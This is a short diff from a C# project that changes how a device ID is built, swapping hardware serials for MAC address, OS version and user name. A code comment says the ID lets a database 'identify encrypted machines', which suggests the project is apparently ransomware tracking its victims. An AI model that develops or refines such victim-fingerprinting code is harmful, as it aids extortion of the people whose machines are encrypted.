@@ -34,9 +34,9 @@ namespace takecare
                 // Generate Device ID for Database to identify encrypted machines
                 return new DeviceIdBuilder()
                     .AddMachineName()
-                    .AddProcessorId()
-                    .AddMotherboardSerialNumber()
-                    .AddSystemDriveSerialNumber()
+                    .AddMacAddress()
+                    .AddOsVersion()
+                    .AddUserName()
                     .ToString();
             }
             catch
